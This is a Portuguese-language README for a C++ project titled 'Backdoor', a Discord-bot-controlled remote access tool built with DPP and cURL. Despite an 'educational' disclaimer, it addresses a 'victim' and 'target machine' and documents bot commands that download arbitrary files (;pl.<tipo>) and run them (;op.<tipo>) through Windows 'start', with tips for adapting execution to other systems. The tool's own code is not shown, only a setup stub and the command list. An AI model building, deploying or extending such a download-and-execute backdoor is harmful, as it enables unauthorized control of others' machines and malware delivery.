# Backdoor

Esse projeto é uma API pública para fins educacionais que se assemelha a um backdoor.  
Você pode utilizá-la junto ao seu programa para realizar downloads e executar arquivos na máquina alvo.  
Isso pode abrir portas para um trojan, mas o objetivo deste projeto não é esse.  

## Instalação das Dependências

Este programa requer **DPP** e **cURL**.  
No Arch Linux, por exemplo, você pode instalá-los facilmente com o AUR:

```sh
yay -S dpp curl
```

    #include "network.hpp"
    
    int main() {
        std::string token = "SEU_TOKEN_AQUI";
        const std::string webhook_url = "SEU_WEBHOOK_AQUI";
        const std::string version = "1.3";

    network program(token, webhook_url, version);
    program.MAIN();
    program.perfomBot();

    return 0;
    }

OBS: O código acima é um exemplo e pode precisar de ajustes para funcionar corretamente.

ATENÇÃO: Se o sistema operacional da vítima não for Windows, o comando de execução do arquivo baixado precisará ser alterado.
Atualmente, ele usa o comando start do Windows. Para modificar, edite a linha 64 do arquivo network.hpp.

Comandos Básicos

Os comandos do bot são acionados pelo prefixo ;.
Segue a lista de comandos disponíveis:
Comando	Função
;shutDown	    Desliga o bot (não a máquina).
;deBugger on	Ativa o modo debug.
;deBugger off	Desativa o modo debug.
;version	    Mostra a versão do bot.
;add <grupo>	Adiciona o bot a um grupo específico.
;pl.<tipo>	    Baixa um arquivo da internet (png, exe, gif, etc.).
;op.<tipo>	    Abre um arquivo baixado.
;credits	    Exibe os créditos do projeto.
;devBot	        Link para configurar o bot no Discord.


Exemplo de Uso:

Para baixar um arquivo .png, envie:

;pl.Png https://example.com/imagem.png

Para abrir o arquivo baixado:

;op.Png
